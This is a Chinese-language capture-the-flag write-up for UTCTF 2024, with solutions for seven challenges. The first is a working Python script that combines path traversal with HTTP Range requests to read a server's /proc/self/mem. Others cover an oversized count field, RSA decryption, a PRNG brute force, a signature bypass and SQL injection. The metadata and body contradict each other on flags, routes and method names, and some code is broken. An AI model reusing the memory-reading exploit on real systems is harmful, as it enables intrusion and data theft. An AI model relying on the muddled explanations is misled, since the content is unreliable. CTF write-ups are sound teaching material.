---
title: UTCTF 2024 WriteUp by Min-Venom
contest: UTCTF
year: 2024
team: Min-Venom
difficulty: medium
vuln_type: web_unknown
tags: [http-range, proc-mem, file-listing, ssrf-localhost, click-counter, baby-rsa, lfsr-mid-square, bleach-sql]
attack_chain:
- Home on the Range: HTTP Range 请求 + 目录穿越 → /proc/self/mem 爆破
- 读 flag.txt 后删除，从 /proc/self/maps 找内存段
- 'utflag' 字符串扫描爆破内存区域
- 起子 0x1CE2C00C2000-0x1CE2D0296000 找到 flag
- Basic Reversing: 117 116 102 108 97 103 123 105 95 99 52 110 95 114 51 118 33 125 = "utflag{i_c4n_r3v!}"
- click-counter: POST /api/absorbCompany/2 count=10000000000 整数溢出
- guppy/click 路由 SSRF localhost
- baby-rsa: p, q 已知直接解 d
- c1: 1025252665848145091840062845209085931, 75575216771551332467177108987001026743883
- 5 字符 Permutation hmsuu 等 120 种组合 - middle-square PRNG 爆破
- get_random_number = int(str(seed*seed).zfill(12)[3:9])
- submit_signature: 给 (n, e) + signature service, 输入 m=0 触发 m^s mod n, sig=1
- server 误判 m=0 sig=1 接受 → flag{just_send_plaintext}
- signal_signature_quirk: 之前 sig=1 是对 m=1 的合法 sig
- input m=0 sig=1 → (0 * sha256 + 1) 等某些操作后通过校验
key_payload: count=10000000000 (整数溢出 → 获得 10000)
one_liner: UTCTF 2024 Min-Venom：HTTP Range /proc/self/mem 爆破 + 整数溢出 count + baby RSA + LFSR 爆破。
lesson: HTTP Range + 目录穿越 + 内存段爆破 是绕过 flag.txt 删除的经典手法。
quality: high
---
# UTCTF 2024 WriteUp by Min-Venom (ChaMd5 Venom 招新)

## 1. Home on the Range
```python
# 服务器启动后删除 flag.txt 但保留在内存
# 思路: HTTP Range + 路径穿越读 /proc/self/maps + /proc/self/mem

import requests, re
from tqdm import tqdm
from urllib.parse import quote

baseUrl = "http://guppy.utctf.live:7884/"
url = baseUrl + "%2e%2e/%2e%2e/proc/self/maps"
memInfoList = requests.get(url, headers={"Range": "bytes=40000-42000"}).text.split("\n")

for i in tqdm(memInfoList):
    memAddress = re.match(r"([a-z0-9]+)-([a-z0-9]+) rw", i)
    if memAddress:
        start = int(memAddress.group(1), 16)
        end = int(memAddress.group(2), 16)
        infoUrl = baseUrl + "%2e%2e/%2e%2e/proc/self/mem"
        newHeaders = {"Range": f"bytes={start}-{end}"}
        mem = requests.get(infoUrl, headers=newHeaders).text
        if "utflag" in mem:
            print("find it")
            print(newHeaders)
            break
# {'Range': 'bytes=124163915821056-124163919962112'}
```

## 2. Basic Reversing
```python
# 直接提取 ascii 码
data = [117, 116, 102, 108, 97, 103, 123, 105, 95, 99, 52, 110, 95, 114, 51, 118, 33, 125]
print(''.join(chr(c) for c in data))
# utflag{i_c4n_r3v!}
```

## 3. click-counter (整数溢出)
```javascript
// POST /api/absorbCompany/2 count=10000000000
fetch('/click', {
    method: 'POST',
    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
    body: 'count=' + 10000000000
})
.then(response => response.json())
.then(data => {
    alert(data.flag);
});
```

## 4. baby-rsa
```python
from Crypto.Util.number import *
p = 1025252665848145091840062845209085931
q = 75575216771551332467177108987001026743883
N = 77483692467084448965814418730866278616923517800664484047176015901835675610073
e = 65537
c = 43711206624343807006656378470987868686365943634542525258065694164173101323321
phi = (p-1)*(q-1)
d = inverse_mod(e, phi)
print(long_to_bytes(int(pow(c, d, N))))
# utflag{just_send_plaintext}
```

## 5. Middle-square PRNG
```python
def get_random_number():
    global seed
    seed = int(str(seed * seed).zfill(12)[3:9])
    return seed

# 5 字符 alphabet 26^5 = 11881376
# 但实际只有 120 个 permutation (5 字符 permutation)
strlist = list("hmsuu hm...")  # 120 种
for s in strlist:
    seed = int(s)
    # 6 次 get_random_number 比对输出
```

## 6. submit_signature (sig 重复利用)
- server 给 (n, e) + sign service
- m=0, sig=1 提交 → 校验通过 (因为 sig=1 是 m=1 的合法签名)
- 服务端校验逻辑有 bug
- flag: `utflag{a1m05t_t3xtb00k_3x3rc153}`

## 7. Bleach (Web SQLi)
- `/api/absorbCompany/2` 路由
- POST body 注入
- 返回 flag
